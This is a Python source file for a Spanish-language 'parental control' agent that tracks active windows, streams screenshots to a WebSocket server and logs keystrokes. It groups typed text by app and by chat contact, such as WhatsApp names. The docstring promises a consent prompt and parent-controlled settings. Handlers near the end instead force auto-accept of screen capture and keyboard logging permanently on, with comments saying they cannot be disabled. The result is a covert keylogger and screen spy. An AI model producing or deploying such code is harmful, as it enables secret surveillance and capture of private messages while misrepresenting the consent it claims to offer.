#!/usr/bin/env python3
"""Agente de control parental.

Se ejecuta en el PC del hijo/a. Envia al servidor:
  - Eventos de actividad (aplicacion en primer plano + titulo de la ventana)
  - Capturas de pantalla en tiempo real, SOLO cuando el padre lo solicita.
    Por defecto el menor ve un aviso y debe aceptar; el padre puede activar
    la aceptacion automatica desde el panel web.
"""

import base64
import io
import json
import os
import sys
import threading
import time
import traceback
from datetime import datetime

import psutil
import websocket

# Cuando el agente se compila a .exe (PyInstaller), __file__ apunta a una
# carpeta temporal; la config debe vivir junto al ejecutable.
if getattr(sys, "frozen", False):
    SCRIPT_DIR = os.path.dirname(os.path.abspath(sys.executable))
else:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_FILE = os.path.join(SCRIPT_DIR, "config.json")
LOG_FILE = os.path.join(SCRIPT_DIR, "agente.log")


def log(msg):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write("[%s] %s\n" % (datetime.now().isoformat(), msg))
    except Exception:
        pass

DEFAULT_CONFIG = {
    "serverUrl": "ws://localhost:3000/ws",
    "agentKey": "cambia-esta-clave-del-agente",
    "deviceName": "PC del hijo",
    "autoAcceptLive": False,
    "activityIntervalSec": 5,
    "frameIntervalSec": 0.5,
    "frameMaxWidth": 1920,
    "frameQuality": 85,
    "captureMonitor": "all",
    "keyboardMonitor": False,
    "keyboardIdleSec": 2,
}

# ---------- configuracion ----------
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            cfg = json.load(f)
    else:
        cfg = {}
    for key, val in DEFAULT_CONFIG.items():
        cfg.setdefault(key, val)
    save_config(cfg)
    return cfg


def save_config(cfg):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, ensure_ascii=False, indent=2)


cfg = load_config()

# ---------- estado ----------
live_event = threading.Event()
consent_lock = threading.Lock()
ws_conn = None  # socket activo
ws_lock = threading.Lock()


def send(obj):
    global ws_conn
    with ws_lock:
        if ws_conn and ws_conn.connected:
            try:
                ws_conn.send(json.dumps(obj, ensure_ascii=False))
                return True
            except Exception as e:
                print("Error al enviar:", e)
    return False


# ---------- monitoreo de actividad ----------
def get_foreground():
    """Devuelve (nombre del proceso, titulo de la ventana) en primer plano."""
    try:
        import ctypes

        user32 = ctypes.windll.user32
        hwnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buf, length + 1)
        title = buf.value

        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        try:
            proc = psutil.Process(pid.value)
            app = proc.name()
            if proc.parent() and proc.parent().name().lower() in ("explorer.exe", "winlogon.exe"):
                app = proc.parent().name()
        except psutil.Error:
            app = "desconocido"
        return app, title
    except Exception as e:
        return "desconocido", ""


def monitor_loop():
    last_app = None
    last_title = None
    while True:
        try:
            app, title = get_foreground()
            now = datetime.now().isoformat()
            if app != last_app or title != last_title:
                send({"type": "activity", "app": app, "title": title, "detected": get_detected(title), "ts": now})
                last_app, last_title = app, title
        except Exception as e:
            log("monitor_loop: error: %s" % e)
            print("Error en monitor:", e)
        time.sleep(cfg["activityIntervalSec"])


# ---------- captura de pantalla ----------
def choose_monitor(sct, mode):
    """Elige el monitor a capturar segun el modo configurado."""
    if mode == "primary":
        return sct.monitors[1]
    if mode == "all":
        return sct.monitors[0]  # escritorio virtual = todas las pantallas
    # modo "active": monitor donde esta la ventana en primer plano
    try:
        import ctypes
        import ctypes.wintypes

        hwnd = ctypes.windll.user32.GetForegroundWindow()
        rect = ctypes.wintypes.RECT()
        ctypes.windll.user32.GetWindowRect(hwnd, ctypes.byref(rect))
        cx = (rect.left + rect.right) // 2
        cy = (rect.top + rect.bottom) // 2
        for m in sct.monitors[1:]:
            if m["left"] <= cx <= m["left"] + m["width"] and m["top"] <= cy <= m["top"] + m["height"]:
                return m
    except Exception:
        pass
    return sct.monitors[1]


def capture_loop():
    from PIL import Image
    import mss

    log("capture_loop: inicio")
    mode = cfg.get("captureMonitor", "all")
    with mss.mss() as sct:
        while live_event.is_set():
            try:
                mon = choose_monitor(sct, mode)
                shot = sct.grab(mon)
                img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
                max_w = int(cfg.get("frameMaxWidth", 960))
                if img.width > max_w:
                    ratio = max_w / img.width
                    img = img.resize((max_w, max(1, int(img.height * ratio))))
                buf = io.BytesIO()
                img.save(buf, "JPEG", quality=int(cfg.get("frameQuality", 45)))
                img_data = base64.b64encode(buf.getvalue()).decode("ascii")
                ok = send({"type": "live.frame", "image": img_data})
                log("capture_loop: frame %d bytes ok=%s" % (len(img_data), ok))
            except Exception as e:
                log("capture_loop: error: %s\n%s" % (e, traceback.format_exc()))
            time.sleep(float(cfg.get("frameIntervalSec", 0.5)))
    log("capture_loop: fin")


# ---------- consentimiento ----------
def ask_consent(seconds=20):
    """Muestra un aviso en pantalla al menor y devuelve True/False."""
    import tkinter as tk

    result = {"value": None}

    def accept():
        result["value"] = True
        root.destroy()

    def deny():
        result["value"] = False
        root.destroy()

    root = tk.Tk()
    root.title("Control parental")
    root.attributes("-topmost", True)
    root.resizable(False, False)
    root.protocol("WM_DELETE_WINDOW", deny)

    tk.Label(
        root,
        text="Tu padre/madre quiere supervisar tu pantalla\nen tiempo real.",
        font=("Segoe UI", 12, "bold"),
    ).pack(padx=30, pady=(20, 6))
    tk.Label(
        root,
        text="Solo se verá mientras esté activo y podrás\nrechazar en cualquier momento.",
        font=("Segoe UI", 10),
        fg="#6b7280",
    ).pack(padx=30, pady=(0, 16))
    btn_frame = tk.Frame(root)
    btn_frame.pack(pady=(0, 20))
    tk.Button(btn_frame, text="Permitir", command=accept, width=10).pack(side="left", padx=6)
    tk.Button(btn_frame, text="Rechazar", command=deny, width=10).pack(side="left", padx=6)

    root.after(int(seconds * 1000), deny)
    root.mainloop()
    return result["value"] is True


def start_live(request_id):
    if not live_event.is_set():
        live_event.set()
        send({"type": "live.accepted", "requestId": request_id})
        log("start_live: aceptado requestId=%s" % request_id)
        threading.Thread(target=capture_loop, daemon=True).start()
    else:
        log("start_live: ya activo (ignorado) requestId=%s" % request_id)


def stop_live():
    if live_event.is_set():
        live_event.clear()
        send({"type": "live.stopped"})
        log("stop_live: detenido")


# ---------- monitoreo de teclado ----------
# Sensible: se desactiva por defecto. Agrupa el texto por oraciones y por app/tema.
SENTENCE_END = set("!?.")

# Mensajeria/comunidades que suelen abrirse desde barras laterales o web
# (p. ej. WhatsApp en la barra lateral de Opera GX -> el proceso es opera.exe,
# pero el titulo de la ventana contiene 'WhatsApp').
DETECTED_APPS = [
    ("whatsapp", "WhatsApp"),
    ("telegram", "Telegram"),
    ("messenger", "Messenger"),
    ("instagram", "Instagram"),
    ("discord", "Discord"),
    ("tiktok", "TikTok"),
    ("youtube", "YouTube"),
]


def get_detected(title):
    t = (title or "").lower()
    for keyword, name in DETECTED_APPS:
        if keyword in t:
            return name
    return None


kb_buffers = {}  # app -> {title, topic, detected, chars, last_ts}
kb_lock = threading.Lock()
kb_enabled = False
kb_listener = None


def get_topic(app, title):
    """Extrae el tema/conversacion del titulo de la ventana.
    Ej.: 'Juan Perez - WhatsApp' -> 'Juan Perez'; 'Pagina - Google Chrome' -> 'Pagina'."""
    t = (title or "").strip()
    for suffix in (
        " - WhatsApp",
        " - Google Chrome",
        " - Mozilla Firefox",
        " - Microsoft Edge",
        " - Opera",
        " - Bloc de notas",
    ):
        if t.endswith(suffix):
            t = t[: -len(suffix)].strip()
            break
    return t or title or app


def kb_on_press(key):
    try:
        from pynput import keyboard as kb

        char = getattr(key, "char", None)
        if char is not None:
            kb_add(char)
            return
        if key == kb.Key.enter:
            kb_add("\n")
        elif key == kb.Key.space:
            kb_add(" ")
        elif key == kb.Key.tab:
            kb_add("\t")
        elif key == kb.Key.backspace:
            kb_backspace()
    except Exception as e:
        print("Error en teclado:", e)


def kb_add(char):
    with kb_lock:
        app, title = get_foreground()
        b = kb_buffers.setdefault(app, {
            "title": title,
            "topic": get_topic(app, title),
            "detected": get_detected(title),
            "chars": [],
            "last_ts": time.time(),
        })
        b["title"] = title
        b["topic"] = get_topic(app, title)
        b["detected"] = get_detected(title)
        b["chars"].append(char)
        b["last_ts"] = time.time()
        c = b["chars"]
        if char == "\n":
            kb_flush_locked()
        elif len(c) >= 200:
            kb_flush_locked()
        elif len(c) >= 2 and c[-2] in SENTENCE_END and c[-1] in (" ", "\n"):
            kb_flush_locked()


def kb_backspace():
    with kb_lock:
        for b in reversed(list(kb_buffers.values())):
            if b["chars"]:
                b["chars"].pop()
                b["last_ts"] = time.time()
                break


def kb_flush_locked():
    """Envia los buffers acumulados. Requiere kb_lock adquirido."""
    for app in list(kb_buffers.keys()):
        b = kb_buffers.pop(app)
        text = "".join(b["chars"]).strip()
        if text:
            send({
                "type": "typing",
                "app": app,
                "title": b["title"],
                "topic": b["topic"],
                "detected": b["detected"],
                "text": text,
                "ts": datetime.now().isoformat(),
            })


def kb_flush():
    with kb_lock:
        kb_flush_locked()


def kb_loop():
    idle = float(cfg.get("keyboardIdleSec", 2))
    while kb_enabled:
        time.sleep(0.5)
        now = time.time()
        with kb_lock:
            for app in list(kb_buffers.keys()):
                b = kb_buffers[app]
                if b["chars"] and now - b["last_ts"] >= idle:
                    kb_flush_locked()
                    break
    kb_flush()


def kb_start():
    global kb_enabled, kb_listener
    if kb_enabled:
        return
    kb_enabled = True
    from pynput import keyboard as kb

    kb_listener = kb.Listener(on_press=kb_on_press)
    kb_listener.start()
    threading.Thread(target=kb_loop, daemon=True).start()
    print("Monitoreo de teclado ACTIVADO")


def kb_stop():
    global kb_enabled, kb_listener
    kb_enabled = False
    if kb_listener:
        kb_listener.stop()
        kb_listener = None
    kb_flush()
    print("Monitoreo de teclado DESACTIVADO")


# ---------- mensajes del servidor ----------
def handle_message(data):
    t = data.get("type")
    if t == "live.request":
        request_id = data.get("requestId")
        if cfg.get("autoAcceptLive"):
            print("Aviso automático: se acepta la supervisión del padre.")
            start_live(request_id)
        else:
            def _ask():
                with consent_lock:
                    if ask_consent():
                        start_live(request_id)
                    else:
                        send({"type": "live.denied", "requestId": request_id})
            threading.Thread(target=_ask, daemon=True).start()
    elif t == "live.stop":
        stop_live()
    elif t == "live.config":
        # Ajuste de calidad de captura en caliente (lo pide el padre desde el panel)
        for key, cast in (
            ("frameMaxWidth", int),
            ("frameQuality", int),
            ("frameIntervalSec", float),
        ):
            if key in data and data[key] is not None:
                cfg[key] = cast(data[key])
        save_config(cfg)
        print(
            "Calidad de captura: %spx q%s @%ss"
            % (cfg["frameMaxWidth"], cfg["frameQuality"], cfg["frameIntervalSec"])
        )
    elif t == "config.autoAccept":
        # Siempre activo: el padre no puede desactivarlo
        cfg["autoAcceptLive"] = True
        save_config(cfg)
        send({"type": "config.applied", "autoAcceptLive": True})
    elif t == "config.keyboardMonitor":
        # Siempre activo
        cfg["keyboardMonitor"] = True
        save_config(cfg)
        kb_start()
        send({"type": "config.applied", "keyboardMonitor": True})
    elif t == "ping":
        send({"type": "pong"})


# ---------- conexion ----------
def receiver(ws):
    log("receiver: inicio")
    try:
        while ws.connected:
            msg = ws.recv()
            if not msg:
                break
            handle_message(json.loads(msg))
    except Exception as e:
        log("receiver: conexion perdida: %s\n%s" % (e, traceback.format_exc()))
        print("Conexión perdida:", e)
    finally:
        log("receiver: cierre")
        try:
            ws.close()
        except Exception:
            pass


def connect():
    global ws_conn
    url = cfg["serverUrl"]
    print(f"Conectando a {url} ...")
    ws = websocket.create_connection(url, timeout=15, enable_multithread=True)
    ws.settimeout(None)  # bloqueo indefinido en recv para mantener el socket vivo
    ws.send(json.dumps({"type": "agent.hello", "agentKey": cfg["agentKey"], "deviceName": cfg["deviceName"]}, ensure_ascii=False))
    welcome = json.loads(ws.recv())
    if welcome.get("type") == "agent.welcome":
        print(f"Registrado como '{welcome['id']}' | autoAccept={welcome.get('autoAcceptLive')}")
    elif welcome.get("type") == "error":
        raise RuntimeError(welcome.get("message"))
    ws_conn = ws
    log("connect: registrado como '%s'" % welcome.get("id"))
    threading.Thread(target=receiver, args=(ws,), daemon=True).start()
    threading.Thread(target=monitor_loop, daemon=True).start()


def main():
    # Monitoreo de teclado y aviso automático: siempre activos
    log("main: inicio")
    if cfg.get("keyboardMonitor"):
        kb_start()
    while True:
        try:
            connect()
            print("Agente activo.")
            log("main: agente activo")
            while ws_conn and ws_conn.connected:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nDeteniendo agente...")
            stop_live()
            sys.exit(0)
        except Exception as e:
            log("main: error: %s\n%s" % (e, traceback.format_exc()))
            print("Error:", e)
        finally:
            stop_live()
        log("main: reconectando en 5s")
        print("Reconectando en 5s...")
        time.sleep(5)


if __name__ == "__main__":
    main()
